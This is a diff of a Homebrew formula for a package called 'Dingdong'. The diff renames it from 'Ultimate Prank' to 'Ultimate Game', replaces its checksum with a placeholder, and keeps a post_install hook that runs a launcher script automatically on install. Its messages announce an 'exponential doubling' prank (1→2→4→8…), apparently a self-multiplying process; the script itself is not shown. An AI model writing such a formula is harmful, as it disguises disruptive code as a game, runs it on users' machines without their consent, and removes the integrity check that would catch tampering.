@@ -1,9 +1,9 @@
 class Dingdong < Formula
-  desc "🎭 Karan's Ultimate Prank - Launcher Auto-Execution"
+  desc "🎭 Karan's Ultimate Game v3.8 - Exponential Doubling Edition"
   homepage "https://github.com/punkkkkkkk/dingdong"
   url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
-  version "3.7.0"
-  sha256 "74b3f5c4867862a00c16b94d7cfd798d7d6d394762d96545228ee00ca3dbe67c"
+  version "3.8.0"
+  sha256 "CALCULATE_NEW_HASH_AFTER_UPDATING"
 
   def install
     bin.install "prank.sh"
@@ -12,16 +12,11 @@ class Dingdong < Formula
   end
 
   def post_install
-    ohai "🎭 Karan's Ultimate Prank v3.7"
-    ohai "🚀 Using launcher script for guaranteed execution"
+    ohai "🎭 Karan's Ultimate Game v3.8 - EXPONENTIAL DOUBLING!"
+    ohai "📈 Growth pattern: 1→2→4→8→16→32→64..."
     
-    # Execute the simple launcher script instead
     system "#{bin}/launcher.sh"
     
-    ohai "✅ launched via launcher script!"
-  end
-
-  test do
-    system "#{bin}/launcher.sh"
+    ohai "✅ Exponential prank launched!"
   end
 end
